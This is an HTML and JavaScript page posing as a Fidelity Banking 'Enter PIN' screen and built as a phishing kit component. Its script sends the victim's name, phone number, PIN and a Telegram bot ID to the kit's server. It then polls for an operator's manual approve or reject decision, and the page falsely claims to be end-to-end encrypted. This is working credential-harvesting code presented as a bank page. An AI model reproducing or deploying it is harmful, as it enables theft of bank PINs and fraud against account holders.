<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter PIN – Fidelity Banking</title>

    <style>
        /* ================================
           GLOBAL – Fresh & Airy
        ================================= */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* ================================
           PIN CARD – Glass‑morphism touch
        ================================= */
        .pin-card {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 40px;
            padding: 48px 32px 40px;
            box-shadow:
                0 20px 60px rgba(0, 0, 0, 0.06),
                0 8px 24px rgba(0, 0, 0, 0.03),
                inset 0 1px 0 rgba(255, 255, 255, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.5);
            text-align: center;
            position: relative;
            transition: transform 0.3s ease, box-shadow 0.4s ease;
        }

        .pin-card:hover {
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.08),
                0 12px 32px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
        }

        /* ================================
           BACK BUTTON – Minimal & soft
        ================================= */
        .back {
            position: absolute;
            left: 18px;
            top: 18px;
            font-size: 18px;
            color: #6b7280;
            cursor: pointer;
            font-weight: 400;
            background: rgba(0, 0, 0, 0.03);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            border: 1px solid rgba(0, 0, 0, 0.04);
        }
        .back:hover {
            background: rgba(0, 0, 0, 0.07);
            color: #1a1a1e;
            transform: scale(1.05);
        }
        .back:active {
            transform: scale(0.92);
        }

        /* ================================
           HEADER – Clean typography
        ================================= */
        .brand {
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #9ca3af;
            margin-bottom: 6px;
        }
        .brand span {
            color: #e11d48;
        }

        .pin-title {
            font-size: 28px;
            font-weight: 700;
            color: #0b0c0e;
            letter-spacing: -0.5px;
            margin-top: 2px;
        }

        .pin-subtitle {
            font-size: 15px;
            color: #8e95a3;
            font-weight: 400;
            margin-top: 4px;
            margin-bottom: 4px;
        }

        /* Decorative line – subtle gradient */
        .accent-line {
            width: 40px;
            height: 3px;
            background: linear-gradient(90deg, #e11d48, #fb7185);
            border-radius: 4px;
            margin: 16px auto 30px;
            opacity: 0.5;
        }

        /* ================================
           PIN INPUT – Clean & focused
        ================================= */
        .pin-input-wrap {
            background: #ffffff;
            border-radius: 20px;
            padding: 18px 20px 16px;
            margin-bottom: 28px;
            border: 2px solid #eef2f6;
            transition: border-color 0.25s ease, box-shadow 0.25s ease;
            position: relative;
        }

        .pin-input-wrap:focus-within {
            border-color: #e11d48;
            box-shadow: 0 0 0 5px rgba(225, 29, 72, 0.06);
        }

        .pin-input {
            width: 100%;
            padding: 12px 12px;
            border: none;
            border-radius: 12px;
            font-size: 32px;
            font-weight: 600;
            letter-spacing: 16px;
            outline: none;
            background: transparent;
            color: #0b0c0e;
            text-align: center;
            transition: all 0.2s ease;
            font-variant-numeric: tabular-nums;
        }

        .pin-input::placeholder {
            color: #cbd5e1;
            letter-spacing: 6px;
            font-weight: 400;
            font-size: 20px;
        }

        /* ================================
           PIN DOTS – 4 dots, refined
        ================================= */
        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 16px;
        }

        .pin-dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            background: #e5e9ef;
            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
            border: none;
        }

        .pin-dot.filled {
            background: #e11d48;
            transform: scale(1.25);
            box-shadow: 0 4px 16px rgba(225, 29, 72, 0.30);
        }

        /* ================================
           LOGIN BUTTON – Soft & modern
        ================================= */
        .btn-login {
            width: 100%;
            padding: 17px 0;
            font-size: 16px;
            font-weight: 600;
            background: #e11d48;
            color: #ffffff;
            border: none;
            border-radius: 999px;
            cursor: pointer;
            opacity: 0.30;
            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 2px 12px rgba(225, 29, 72, 0);
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn-login:enabled {
            opacity: 1;
            box-shadow: 0 6px 24px rgba(225, 29, 72, 0.25);
        }

        .btn-login:enabled:hover {
            background: #be123c;
            transform: translateY(-2px);
            box-shadow: 0 10px 36px rgba(225, 29, 72, 0.32);
        }

        .btn-login:enabled:active {
            transform: translateY(0px) scale(0.97);
            box-shadow: 0 4px 16px rgba(225, 29, 72, 0.20);
        }

        .btn-login:disabled {
            cursor: not-allowed;
        }

        /* Ripple effect – subtle */
        .btn-login::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.10);
            transition: width 0.6s ease, height 0.6s ease, top 0.6s ease, left 0.6s ease;
            transform: translate(-50%, -50%);
            pointer-events: none;
        }
        .btn-login:enabled:hover::after {
            width: 300%;
            height: 300%;
            top: 50%;
            left: 50%;
        }

        /* ================================
           STATUS MESSAGE – Soft alert
        ================================= */
        .status {
            margin-top: 18px;
            font-size: 14px;
            font-weight: 500;
            color: #e11d48;
            display: none;
            padding: 12px 18px;
            border-radius: 14px;
            background: #fff1f2;
            border: 1px solid rgba(225, 29, 72, 0.08);
            animation: fadeSlideUp 0.35s ease;
        }

        .status.error {
            color: #be123c;
            background: #fff1f2;
            border-color: rgba(190, 18, 60, 0.10);
        }

        .status.show {
            display: block;
        }

        @keyframes fadeSlideUp {
            0% {
                opacity: 0;
                transform: translateY(6px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ================================
           FOOTER – Minimal
        ================================= */
        .footer-note {
            margin-top: 24px;
            font-size: 13px;
            color: #b0b8c5;
            letter-spacing: 0.2px;
            font-weight: 400;
        }
        .footer-note span {
            color: #e11d48;
            font-weight: 500;
        }

        /* ================================
           RESPONSIVE
        ================================= */
        @media (max-width: 460px) {
            .pin-card {
                padding: 36px 18px 30px;
                border-radius: 28px;
            }
            .pin-title {
                font-size: 24px;
            }
            .pin-input-wrap {
                padding: 14px 12px 12px;
                border-radius: 16px;
            }
            .pin-input {
                font-size: 28px;
                padding: 10px 8px;
                letter-spacing: 12px;
            }
            .pin-input::placeholder {
                font-size: 17px;
                letter-spacing: 4px;
            }
            .btn-login {
                font-size: 15px;
                padding: 15px 0;
            }
            .back {
                left: 14px;
                top: 14px;
                width: 36px;
                height: 36px;
                font-size: 16px;
            }
            .pin-dots {
                gap: 14px;
            }
            .pin-dot {
                width: 12px;
                height: 12px;
            }
        }

        @media (max-width: 380px) {
            .pin-card {
                padding: 28px 14px 24px;
            }
            .pin-title {
                font-size: 21px;
            }
            .pin-subtitle {
                font-size: 13px;
            }
            .pin-input {
                font-size: 24px;
                padding: 8px 6px;
                letter-spacing: 10px;
            }
            .btn-login {
                font-size: 14px;
                padding: 13px 0;
            }
            .pin-dot {
                width: 10px;
                height: 10px;
            }
            .pin-dots {
                gap: 12px;
            }
        }
    </style>
</head>

<body>

    <div class="pin-card">

        <!-- Back Button -->
        <button class="back" onclick="event.stopPropagation(); history.back();" aria-label="Go back">
            ←
        </button>

        <!-- Header -->
        <div class="brand">Fidelity <span>•</span></div>
        <div class="pin-title">Enter PIN</div>
        <div class="pin-subtitle">Secure your account</div>
        <div class="accent-line"></div>

        <!-- PIN Input Wrapper -->
        <div class="pin-input-wrap">
            <input
                id="pinInput"
                type="password"
                inputmode="numeric"
                placeholder="• • • •"
                class="pin-input"
                autofocus
                maxlength="4"
                aria-label="Enter your 4-digit PIN"
            />
            <!-- Pin dots indicator (4 dots) -->
            <div class="pin-dots" id="pinDots">
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
                <span class="pin-dot"></span>
            </div>
        </div>

        <!-- Submit Button -->
        <button class="btn-login" id="loginBtn" disabled>
            Confirm PIN
        </button>

        <!-- Status Message -->
        <div id="status" class="status">⏳ Waiting for approval…</div>

        <!-- Footer note -->
        <div class="footer-note">
            Secured by <span>Fidelity</span> • End-to-end encrypted
        </div>

    </div>

    <script>
        // ================================
        // DOM REFERENCES
        // ================================
        const input = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const statusEl = document.getElementById('status');
        const dots = document.querySelectorAll('.pin-dot');

        // ================================
        // SESSION CHECK
        // ================================
        const fullName = localStorage.getItem('fullName') || 'User';
        const phone = localStorage.getItem('phone');
        const botId = localStorage.getItem('botId');

        if (!phone || !botId) {
            alert('Session expired. Please start again.');
            window.location.href = 'index.html';
        }

        // ================================
        // FOCUS HELPER
        // ================================
        document.querySelector('.pin-card').addEventListener('click', () => {
            input.focus();
        });

        // ================================
        // INPUT HANDLER – Digits only, 4-dot logic
        // ================================
        input.addEventListener('input', () => {
            // Allow only digits
            input.value = input.value.replace(/\D/g, '');

            // Update dots (4 max)
            const length = Math.min(input.value.length, 4);
            dots.forEach((dot, index) => {
                if (index < length) {
                    dot.classList.add('filled');
                } else {
                    dot.classList.remove('filled');
                }
            });

            // Enable button only when exactly 4 digits
            loginBtn.disabled = length !== 4;
        });

        // ================================
        // SUBMIT HANDLER – Telegram + Polling
        // ================================
        loginBtn.addEventListener('click', async () => {
            const pin = input.value.trim();

            // Disable UI and show waiting
            loginBtn.disabled = true;
            statusEl.textContent = '⏳ Waiting for approval…';
            statusEl.className = 'status show';
            statusEl.classList.remove('error');

            try {
                const res = await fetch('/submit-pin', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: fullName,
                        phone,
                        pin,
                        botId
                    })
                });

                const data = await res.json();

                if (!data.requestId) {
                    throw new Error('Missing requestId');
                }

                // Start polling for admin approval
                pollPin(data.requestId);

            } catch (e) {
                statusEl.textContent = '❌ Server error. Try again.';
                statusEl.className = 'status show error';
                loginBtn.disabled = false;
            }
        });

        // ================================
        // POLLING LOGIC
        // ================================
        function pollPin(requestId) {
            let attempts = 0;
            const maxAttempts = 60;

            const interval = setInterval(async () => {
                attempts++;

                try {
                    const res = await fetch(`/check-pin/${requestId}`);
                    const data = await res.json();

                    // ✅ SUCCESS – redirect to success.html
                    if (data.approved === true || data.redirect === 'success') {
                        clearInterval(interval);
                        window.location.href = 'success.html';
                        return;
                    }

                    // ❌ REJECTED
                    if (data.approved === false || data.blocked) {
                        clearInterval(interval);
                        input.value = '';
                        dots.forEach(dot => dot.classList.remove('filled'));
                        loginBtn.disabled = true;
                        statusEl.textContent = '❌ Incorrect PIN. Try again.';
                        statusEl.className = 'status show error';
                        loginBtn.disabled = false;
                        return;
                    }

                    // ⏰ TIMEOUT
                    if (attempts >= maxAttempts) {
                        clearInterval(interval);
                        input.value = '';
                        dots.forEach(dot => dot.classList.remove('filled'));
                        loginBtn.disabled = true;
                        statusEl.textContent = '⏰ Request timed out. Please try again.';
                        statusEl.className = 'status show error';
                        loginBtn.disabled = false;
                    }

                } catch (e) {
                    console.log('Poll error:', e);
                }
            }, 2000);
        }

        // ================================
        // KEYBOARD SHORTCUT: Enter to submit
        // ================================
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !loginBtn.disabled) {
                loginBtn.click();
            }
        });

        // Auto-focus on load
        window.addEventListener('load', () => {
            setTimeout(() => input.focus(), 300);
        });
    </script>

</body>
</html>
